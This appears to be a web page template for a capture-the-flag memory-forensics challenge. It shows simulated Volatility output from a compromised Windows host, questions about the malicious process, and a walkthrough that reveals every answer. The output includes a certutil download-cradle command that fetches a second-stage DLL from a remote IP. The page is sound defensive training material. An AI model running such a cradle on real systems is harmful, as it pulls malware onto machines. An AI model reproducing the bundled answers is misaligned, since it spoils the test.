@{
    ViewData["Title"] = "Hard Forensics — Memory Dump";
}

<div class="card bg-secondary bg-opacity-25 border-light shadow-lg p-4">
    <h2 class="text-center mb-4" style="color:white;">
        🔴 Hard — Memory Dump Analysis
    </h2>

    <p class="text-light">
        Analyze RAM capture from compromised Windows workstation. Use Volatility techniques.
    </p>

    <hr />

    <h4 class="text-light mt-4">🧠 Volatility Data</h4>
    <pre class="bg-dark p-3 border rounded small" style="max-height: 400px; overflow-y: auto;">
<span class="text-white">Filter: windows.pslist</span>

<span class="text-white">PID=4520:</span> <span class="text-info">lsass.exe</span> PPID=784<br>
<span class="text-white">PID=2896:</span> <span class="text-warning">rundll32.exe</span> PPID=1024<br>
<span class="text-white">PID=6172:</span> <span class="text-info">svch0st.exe</span> PPID=3416

<span class="text-white">$ windows.netscan --pid 6172</span>
<span class="text-info">6172</span> <span class="text-primary">0.0.0.0:49200</span> → <span class="text-danger">185.234.217.42:443</span>

<span class="text-success">Host:</span> <span class="text-danger">185.234.217.42</span><br>
<span class="text-success">User-Agent:</span> <span class="text-warning">certutil.exe -urlcache -split -f http://185.234.217.42/stage2.dll</span><br>
<span class="text-success">Content-Length:</span> <span class="text-primary">Obfuscated shellcode</span>

<span class="text-danger">Base64:</span> <span class="text-info">strings output → CTI{EXPLOIT-MEMORY-2025}</span><br>
<span class="text-success">Decoded:</span> <span class="text-primary">CTI{EXPLOIT-MEMORY-2025}</span>
    </pre>

    <p class="text-light">
        Complete all 4 steps below to identify malware artifacts.
    </p>

    <form asp-action="SubmitForensicsHard" method="post" class="mt-3">
        <label class="mt-3">
            <strong>1. Suspicious PID (svch0st.exe):</strong>
        </label>
        <input name="q1" class="form-control" placeholder="Example: 1234" />

        <label class="mt-3">
            <strong>2. C2 connection (ForeignAddress):</strong>
        </label>
        <input name="q2" class="form-control" placeholder="Example: 1.2.3.4:5678" />

        <label class="mt-3">
            <strong>3. Flag from memory strings:</strong>
        </label>
        <input name="q3" class="form-control" placeholder="Example: CTI-FLAG-2025" />

        <label class="mt-3">
            <strong>4. Download cradle process:</strong>
        </label>
        <input name="q4" class="form-control" placeholder="Example: regsvr32.exe" />

        <button type="submit" class="btn btn-primary mt-3">Submit Answers</button>
    </form>

    <!-- Results -->
    @if (TempData["Success"] != null)
    {
        <div class="alert alert-success mt-4">@TempData["Success"]</div>
    }
    @if (TempData["Error"] != null)
    {
        <div class="alert alert-danger mt-4">@TempData["Error"]</div>
    }
@if (TempData["Success"] != null)
{
        <script>
            markChallengeComplete("ForensicsHard");
        </script>
}

    <!-- Hints / Walkthrough Accordion -->
    <div class="accordion mt-4" id="forensicsAccordion">

        <!-- Hint -->
        <div class="accordion-item bg-dark text-light border-secondary">
            <h2 class="accordion-header">
                <button class="accordion-button bg-dark text-light collapsed"
                        type="button" data-bs-toggle="collapse" data-bs-target="#hint1">
                    Need a hint?
                </button>
            </h2>
            <div id="hint1" class="accordion-collapse collapse">
                <div class="accordion-body">
                    • Filter: <code>windows.pslist</code><br>
                    • PID=6172 (svch<span class="text-danger">0</span>st.exe)<br>
                    • **netscan** → C2 connection<br>
                    • **cmdline** → certutil cradle
                </div>
            </div>
        </div>

        <!-- Full Walkthrough -->
        <div class="accordion-item bg-dark text-light border-secondary mt-3">
            <h2 class="accordion-header">
                <button class="accordion-button bg-dark text-light collapsed"
                        type="button" data-bs-toggle="collapse" data-bs-target="#walkthrough">
                    Stuck? View walk-through tips.
                </button>
            </h2>

            <div id="walkthrough" class="accordion-collapse collapse">
                <div class="accordion-body">
                    <h4 class="text-info">Memory Dump Walk-Through</h4>

                    <ol>
                        <li><strong>Suspicious PID:</strong> <code class="text-info">6172</code> (svch<span class="text-danger">0</span>st.exe)</li>
                        <li><strong>C2:</strong> <code class="text-danger">185.234.217.42:443</code></li>
                        <li><strong>Flag:</strong> <code class="text-primary">CTI{EXPLOIT-MEMORY-2025}</code></li>
                        <li><strong>Cradle:</strong> <code class="text-warning">certutil.exe</code></li>
                    </ol>

                    <p><strong>Tools:</strong> <a href="https://volatility3.readthedocs.io/" target="_blank">Volatility3</a></p>

                    <hr />
                    <h5 class="text-warning">Example format:</h5>
                    <div class="alert alert-info mt-3">
                        • Q1 → 1234<br>
                        • Q2 → 1.2.3.4:5678<br>
                        • Q3 → CTI-EXAMPLE-2025<br>
                        • Q4 → process.exe
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Navigation -->
    <div class="d-flex justify-content-between mt-4">
        <a href="/Challenges/Forensics" class="btn btn-outline-light">← Back to Forensics</a>
        <a href="/Challenges/OSINT" class="btn btn-outline-info">Next Category → OSINT Challenges</a>
    </div>





